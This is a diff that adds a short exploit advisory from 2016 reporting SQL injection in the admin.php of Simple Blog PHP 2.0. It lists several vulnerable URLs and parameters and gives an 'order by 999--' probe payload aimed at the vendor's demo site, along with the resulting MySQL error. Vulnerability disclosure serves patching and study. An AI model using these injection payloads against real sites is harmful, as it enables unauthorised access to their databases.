@@ -1,0 +1,36 @@
+=====================================================
+# Simple Blog PHP 2.0 - SQL Injection
+=====================================================
+# Vendor Homepage: http://simpleblogphp.com/
+# Date: 13 Oct 2016
+# Demo Link : http://simpleblogphp.com/blog/admin.php
+# Version : 2.0
+# Platform : WebApp - PHP
+# Author: Ashiyane Digital Security Team
+# Contact: hehsan979@gmail.com
+=====================================================
+# SQL Injection
+This vulnerability is in admin.php file when we want to edit a post or
+edit a categorie and..., with id parameter can show sql injection.
+
+#PoC:
+Vulnerable Url:
+http://localhost/blog/admin.php?act=editPost&id=[payload]
+http://localhost/blog/admin.php?act=editCat&id=[payload]
+http://localhost/blog/admin.php?act=editComment&id=[payload]
+http://localhost/blog/admin.php?act=comments&post_id=[payload]
+Vulnerable parameter : id
+Mehod : GET
+
+A simple inject :
+Payload : '+order+by+999--+
+http://simpleblogphp.com/blog/admin.php?act=editPost&id=1'+order+by+999--+
+
+In response can see result :
+Could not execute MySQL query: SELECT * FROM blog_posts WHERE id=''
+order by 999-- ' . Error: Unknown column '999' in 'order clause'
+
+Result of payload: Error: Unknown column '999' in 'order clause'
+=====================================================
+# Discovered By : Ehsan Hosseini
+=====================================================
